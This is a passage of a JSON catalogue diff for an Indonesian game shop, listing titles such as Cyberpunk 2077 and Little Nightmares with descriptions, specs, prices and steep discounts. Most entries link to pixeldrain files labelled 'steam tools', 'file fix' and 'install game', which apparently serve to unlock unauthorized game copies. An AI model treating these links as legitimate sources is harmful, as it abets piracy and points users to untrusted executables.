+    "voratools_link": "https://vzdwtudduxjvxjniyexm.supabase.co/storage/v1/object/public/game-assets/voratools/0.9261603902118388.zip"
+  },
+  {
+    "id": "da84443f-7e9f-45b4-a080-a63ef58d0139",
+    "title": "Buckshot Roulette",
+    "price": 28999,
+    "description": "Buckshot Roulette adalah game horror strategi dengan konsep unik yang terinspirasi dari permainan Russian roulette, tetapi menggunakan shotgun. Pemain akan menghadapi dealer misterius dalam permainan hidup-mati, di mana setiap putaran berisi peluru asli dan kosong yang harus ditebak secara taktis. Dengan suasana gelap, tegang, dan minimalis, game ini menggabungkan elemen psikologis, perhitungan risiko, serta penggunaan item untuk memanipulasi peluang bertahan hidup.",
+    "thumbnail": "https://tse2.mm.bing.net/th/id/OIP.J_a2L_vP-pnc9ue6udsJygHaLH?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EFscEhGH",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/M9YFYZ2C",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-23T06:27:06.404196+00:00",
+    "genre": "Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/10 (64-bit)",
+        "cpu": "Dual Core 2.0 GHz",
+        "gpu": "Integrated / GPU ringan",
+        "ram": "2 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Dual Core 2.5 GHz atau lebih",
+        "gpu": "GPU ringan modern",
+        "ram": "4 GB"
+      }
+    },
+    "discount_price": 5000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "dca39e5d-0ed3-43d4-9d5c-729ca33988c2",
+    "title": "Jujutsu Kaisen Cursed Clash",
+    "price": 599000,
+    "description": "Jujutsu Kaisen: Cursed Clash adalah game fighting berbasis anime yang mengadaptasi cerita dari season awal Jujutsu Kaisen dan film Jujutsu Kaisen 0, di mana pemain bertarung menggunakan karakter seperti Yuji Itadori, Gojo Satoru, dan lainnya dalam sistem pertarungan 2 vs 2. Game ini menonjolkan penggunaan “cursed techniques” unik tiap karakter serta kerja sama tim untuk menciptakan kombinasi serangan kuat, sambil menghadapi musuh berupa kutukan dalam pertarungan cepat dan penuh efek visual khas anime.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/75c47f31-9139-31aa-b942-af59878d1e92/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/RanrWgiT",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/LDCLxnrr",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-23T06:56:08.253271+00:00",
+    "genre": "Action",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i5-2300 / Ryzen 3 1200",
+        "gpu": "GTX 660 / Radeon HD 7950",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i5-3470 / Ryzen 5 1400",
+        "gpu": "GTX 970 / RX 570",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 6000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "e0515c49-8780-4d60-ac42-1da1c08662bc",
+    "title": "Horizon Forbidden West™ Complete Edition",
+    "price": 879000,
+    "description": "Horizon Forbidden West Complete Edition adalah game action RPG open-world yang mengikuti petualangan Aloy di dunia masa depan pasca-apokaliptik, di mana manusia hidup berdampingan dengan mesin-mesin raksasa. Dalam game ini, Aloy menjelajahi wilayah barat yang berbahaya untuk mengungkap misteri wabah yang mengancam kehidupan di Bumi, menghadapi badai dahsyat, suku-suku baru, serta mesin yang lebih mematikan. Versi Complete Edition mencakup game utama dan ekspansi Burning Shores, menghadirkan cerita tambahan, area baru, dan konten lebih luas.",
+    "thumbnail": "https://tse4.mm.bing.net/th/id/OIP.eTkzAIFlbLR48gq2nsuAuQHaJQ?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/2JKVwPAK",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-23T06:48:40.148208+00:00",
+    "genre": "Action, RPG, Open World",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel Core i3-8100 / Ryzen 3 1300X",
+        "gpu": "GTX 1650 / RX 5500 XT",
+        "ram": "16 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i5-8600 / Ryzen 5 3600",
+        "gpu": "RTX 3060 / RX 5700",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "20649fb3-4c44-4d06-87bb-c955f5488bb0",
+    "title": "Little Nightmares III",
+    "price": 399000,
+    "description": "Little Nightmares III adalah game puzzle-platformer horror yang mengikuti petualangan dua anak, Low dan Alone, yang terjebak di dunia mimpi buruk bernama “The Nowhere”. Mereka harus bekerja sama untuk bertahan hidup dan melarikan diri dari ancaman mengerikan di lingkungan yang penuh ilusi dan makhluk menyeramkan. Dengan atmosfer gelap khas seri ini, game ini menekankan eksplorasi, puzzle, dan kerja sama antar karakter dalam menghadapi dunia yang tidak ramah bagi anak-anak.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/50294b1b-7cfd-3728-99db-cb35e4a10418/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/fwXaHcjR",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial i nstall"
+      },
+      {
+        "url": "https://pixeldrain.com/u/5ie6kWxX",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-23T07:01:38.615991+00:00",
+    "genre": "Survival horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel i5 / Ryzen 5",
+        "gpu": "GTX 1050 Ti / RX 570",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel i7 / Ryzen 5–7",
+        "gpu": "GTX 1660 / RTX 2060",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "2a270416-00a0-41f3-a80c-9a1911e10ab7",
+    "title": "Little Nightmares",
+    "price": 199000,
+    "description": "Little Nightmares adalah game puzzle-platformer horror yang mengikuti seorang anak kecil bernama Six yang terjebak di sebuah tempat misterius bernama The Maw—sebuah kapal besar yang dihuni oleh makhluk aneh dan menyeramkan. Pemain harus membantu Six melarikan diri dengan cara bersembunyi, memecahkan teka-teki, dan menghindari musuh tanpa banyak kemampuan bertarung, sambil menghadapi dunia gelap yang penuh simbolisme dan suasana mencekam.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/cf41fecb-e5eb-3663-929c-4b7af6cdd3b4/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/zvd4YKht",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-23T11:28:07.018146+00:00",
+    "genre": "Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/8/10 (64-bit)",
+        "cpu": "Intel CPU 2.6 GHz",
+        "gpu": "GTX 460 / Radeon HD 6850",
+        "ram": "4 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel i5",
+        "gpu": "GTX 760 / RX 560",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 5000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "b91cdd92-e430-41b9-a33b-de179dbe41b4",
+    "title": "Little Nightmares II",
+    "price": 299000,
+    "description": "Little Nightmares II adalah game puzzle-platformer horror yang mengikuti perjalanan seorang anak bernama Mono yang terjebak di dunia gelap penuh distorsi bernama The Pale City. Ia ditemani oleh Six, dan bersama-sama mereka berusaha bertahan hidup sambil mengungkap rahasia dunia yang dikendalikan oleh sinyal misterius dari menara. Pemain harus memecahkan teka-teki, bersembunyi dari musuh menyeramkan, dan sesekali melawan dengan alat sederhana dalam suasana yang tegang dan penuh simbolisme.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/e5d5dae0-abdc-3ca2-99ac-25438b0a0635/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/NXX62hAf",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-23T11:31:32.049417+00:00",
+    "genre": "Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i5-2300 / AMD FX-4350",
+        "gpu": "GTX 570 / Radeon HD 7850",
+        "ram": "4 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i7-3770 / Ryzen 5 1600",
+        "gpu": "GTX 760 / RX 560",
+        "ram": "4 GB"
+      }
+    },
+    "discount_price": 5000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "fa264136-51eb-4e3f-90f6-40b920201fdd",
+    "title": "Dark Hours",
+    "price": 130999,
+    "description": "Dark Hours adalah game co-op survival horror di mana pemain berperan sebagai sekelompok perampok yang awalnya melakukan pencurian, namun rencana tersebut berubah menjadi mimpi buruk ketika kejadian supernatural terjadi dan mereka terjebak di dalam gedung bersama makhluk mengerikan. Pemain harus bekerja sama untuk bertahan hidup, menjelajahi area, memecahkan puzzle, dan mencari jalan keluar sambil menghindari atau melawan entitas yang terus memburu mereka dalam suasana gelap dan penuh tekanan.",
+    "thumbnail": "https://assets-prd.ignimgs.com/2024/10/09/dark-hours-button-1728488827082.jpg",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/T4p95bYm",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "box",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "box",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/LGJe45rQ",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-23T06:33:57.568957+00:00",
+    "genre": "Survival,Action,Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel i5 / Ryzen 5",
+        "gpu": "GTX 1060 / RX 580",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel i7 / Ryzen 7",
+        "gpu": "RTX 2060 ke atas",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "8180bb6c-83d2-4abc-9a69-03b8293cbb1d",
+    "title": "Phasmophobia",
+    "price": 169000,
+    "description": "Phasmophobia adalah game co-op psychological horror di mana kamu dan tim (hingga 4 pemain) berperan sebagai pemburu hantu yang menyelidiki lokasi angker untuk mengidentifikasi jenis roh yang menghantui tempat tersebut. Pemain harus mengumpulkan bukti menggunakan berbagai alat seperti EMF reader, spirit box, dan kamera, sambil bertahan dari gangguan atau serangan hantu yang bisa bereaksi terhadap suara pemain secara langsung. Game ini sangat mengandalkan kerja sama tim, komunikasi, dan keberanian dalam suasana yang tegang dan realistis.",
+    "thumbnail": "https://tse2.mm.bing.net/th/id/OIP.j4kfpzbdPBrlnkpoQkeH_wHaLH?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/MacKkQhu",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/WsCtFRmJ",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-23T11:38:10.377531+00:00",
+    "genre": "Horror, Survival",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i5-4590 / AMD Ryzen 5 2600",
+        "gpu": "GTX 970 / Radeon R9 390",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel i7 / Ryzen 7",
+        "gpu": "RTX 2060 / RX 5700",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "f0acc296-286c-47ae-bb1f-7a78b17faa3e",
+    "title": "PRAGMATA",
+    "price": 799000,
+    "description": "Pragmata adalah game sci-fi action-adventure dari Capcom yang berlatar di masa depan dekat, dengan setting misterius di bulan. Pemain mengikuti perjalanan seorang astronot dan seorang gadis AI bernama Diana yang bekerja sama untuk bertahan hidup dan mengungkap rahasia fasilitas penelitian yang ditinggalkan. Game ini menonjolkan hubungan antara manusia dan kecerdasan buatan, dengan gameplay yang menggabungkan aksi, eksplorasi, serta mekanik unik kerja sama antara dua karakter dalam menghadapi ancaman robot dan sistem keamanan futuristik.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/ea0e8803-316f-360e-9e0a-59c2f6bf3ba2/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/GSwXU8XX",
+        "icon": "fix",
+        "label": "Fix / Update"
+      },
+      {
+        "url": "https://pixeldrain.com/u/xm6e1MrU",
+        "icon": "guide",
+        "label": "Tutorial / Guide"
+      }
+    ],
+    "created_at": "2026-04-22T11:07:36.130673+00:00",
+    "genre": "Action, Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10/11 64-bit",
+        "cpu": "Intel Core i5-9600K / Ryzen 5 3600",
+        "gpu": "GTX 1660 Super / RX 5600 XT",
+        "ram": "16 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i7-12700K / Ryzen 7 5800X",
+        "gpu": "RTX 3060 Ti / RX 6700 XT",
+        "ram": "32 GB"
+      }
+    },
+    "discount_price": 25000,
+    "is_trending": true,
+    "connectivity_type": "Offline",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": "\t3357650",
+    "voratools_link": "https://vzdwtudduxjvxjniyexm.supabase.co/storage/v1/object/public/game-assets/voratools/0.7808772385424023.zip"
+  },
+  {
+    "id": "85bc2dd8-7845-4edf-960f-fd640f7e264e",
+    "title": "CarX Street",
+    "price": 299999,
+    "description": "CarX Street adalah game open-world street racing yang berfokus pada balapan jalanan dengan sistem handling realistis khas seri CarX. Pemain dapat menjelajahi kota besar bernama Sunset City, mengikuti berbagai jenis balapan, melakukan tuning mobil secara mendalam, serta membangun koleksi kendaraan untuk menjadi pembalap jalanan terbaik. Game ini menonjolkan sensasi drifting, kecepatan tinggi, dan kebebasan eksplorasi dalam dunia open-world modern.",
+    "thumbnail": "https://tse2.mm.bing.net/th/id/OIP.q5pAidY_22DY5n8kSf7SSQHaLH?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CfVGyXQk",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/RTyjui3U",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-05-09T16:23:44.008102+00:00",
+    "genre": "Open World",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i5-8400 / Ryzen 5 2600",
+        "gpu": "GTX 1050 Ti / RX 570",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i7-9700K / Ryzen 7 3700X",
+        "gpu": "RTX 2060 / RX 6600 XT",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "3a80275e-3e44-4616-b444-e0c85b2efb83",
+    "title": "Days Gone",
+    "price": 579000,
+    "description": "Days Gone adalah game open-world action survival yang mengikuti kisah Deacon St. John, mantan anggota geng motor yang berusaha bertahan hidup di dunia pasca-apokaliptik yang dipenuhi makhluk mirip zombie bernama Freakers. Saat menjelajahi hutan, kota rusak, dan pegunungan Oregon, Deacon harus melawan manusia berbahaya, mencari resource, serta mengungkap misteri tentang istrinya yang diyakini telah meninggal. Game ini terkenal dengan sistem horde besar yang menghadirkan ratusan Freakers sekaligus dalam satu pertarungan.",
+    "thumbnail": "https://tse4.mm.bing.net/th/id/OIP.jQeffUaolwWjo6FA0w0lmgHaKE?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/rb5v5DCM",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-05-09T16:47:32.960312+00:00",
+    "genre": "Action, Adventure, Open World",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel Core i5-2500K / Ryzen 3 1200",
+        "gpu": "GTX 780 / RX 560",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i7-4770K / Ryzen 5 1500X",
+        "gpu": "GTX 1060 (6GB) / RX 580",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "93aac253-ceb4-4dbc-a2b8-91e18b9adf65",
+    "title": "Cyberpunk 2077",
+    "price": 699999,
+    "description": "Cyberpunk 2077 adalah game open-world action RPG yang berlatar di kota futuristik bernama Night City, sebuah dunia penuh teknologi canggih, korporasi besar, kriminal, dan modifikasi tubuh manusia (cyberware). Pemain berperan sebagai V, seorang mercenary yang mencari cara untuk bertahan hidup setelah chip misterius berisi kesadaran legenda rocker-teroris Keanu Reeves sebagai karakter Johnny Silverhand tertanam di kepalanya. Game ini menawarkan kebebasan bermain dengan kombinasi combat, hacking, stealth, eksplorasi, dan pilihan cerita yang memengaruhi jalannya permainan.",
+    "thumbnail": "https://tse1.mm.bing.net/th/id/OIP.NSlU9gXGETC-UJGhdMRJUwHaLH?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/xP1cnzNb",
+        "icon": "box",
+        "label": "file games"
+      }
+    ],
+    "created_at": "2026-05-09T16:10:29.812292+00:00",
+    "genre": "Action, RPG, Open World",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel Core i7-6700 / Ryzen 5 1600",
+        "gpu": "GTX 1060 (6GB) / RX 580 / Arc A380",
+        "ram": "12 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i7-12700 / Ryzen 7 7800X3D",
+        "gpu": "RTX 2060 Super / RX 5700 XT / Arc A770",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "488c4064-fe0f-4408-bc7e-1d205c14d74d",
+    "title": "Black Myth: Wukong",
+    "price": 699999,
+    "description": "Black Myth: Wukong adalah game action RPG yang terinspirasi dari novel klasik Tiongkok Journey to the West. Pemain mengendalikan sosok “The Destined One”, pejuang mirip Sun Wukong yang melakukan perjalanan menghadapi monster, dewa, dan makhluk mitologi dalam dunia fantasi gelap yang penuh detail. Game ini menghadirkan pertarungan cepat dan menantang dengan kemampuan transformasi, sihir, serta berbagai jurus tongkat khas Sun Wukong, dipadukan dengan visual realistis menggunakan Unreal Engine 5.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/300d25f5-f58d-3616-ad13-e17474bf4852/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/jQGthfVp",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "fix",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/ZRx27Trk",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-05-09T16:36:16.130202+00:00",
+    "genre": "Action, RPG",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel Core i5-8400 / Ryzen 5 1600",
+        "gpu": "GTX 1060 (6GB) / RX 580",
+        "ram": "16 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i7-9700 / Ryzen 5 5500",
+        "gpu": "RTX 2060 / RX 5700 XT",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 20000,
+    "is_trending": true,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "1cd5d394-4b7b-4803-8080-07638befe79e",
+    "title": "Escape the Backrooms",
+    "price": 84500,
+    "description": "Escape the Backrooms adalah game co-op survival horror yang membawa pemain ke dunia misterius bernama Backrooms—labirin tak berujung dengan suasana aneh dan menyeramkan. Pemain harus menjelajahi berbagai level yang berbeda, memecahkan puzzle, dan bekerja sama untuk mencari jalan keluar sambil menghindari entitas berbahaya yang berkeliaran. Dengan atmosfer yang menekan dan desain lingkungan yang tidak nyaman, game ini menekankan eksplorasi, komunikasi tim, dan ketahanan mental dalam menghadapi ketidakpastian.",
+    "thumbnail": "https://static0.gamerantimages.com/wordpress/wp-content/uploads/2024/12/mixcollage-10-dec-2024-07-34-pm-3390.jpg?q=49&fit=contain&w=480&dpr=2",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/LuAAtQSo",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/n4pRJtHr",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-23T11:47:48.512984+00:00",
+    "genre": "\tSurvival horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i5-2300 / AMD FX-6300",
+        "gpu": "GTX 750 Ti / Radeon R7 360",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i5-8400 / Ryzen 5 2600",
+        "gpu": "GTX 1060 / RX 580",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "25427071-cc94-4c1d-8ac9-2301d62ee24b",
+    "title": "Resident Evil 6",
+    "price": 259000,
+    "description": "Resident Evil 6 dari Capcom mencoba menghadirkan skala cerita paling besar di seri ini. Game ini memiliki empat campaign berbeda dengan karakter utama seperti Leon S. Kennedy, Chris Redfield, Jake Muller, dan Ada Wong.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/f822a445-e567-3751-b18e-e4bc42b96edf/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/c6dvD3zm",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
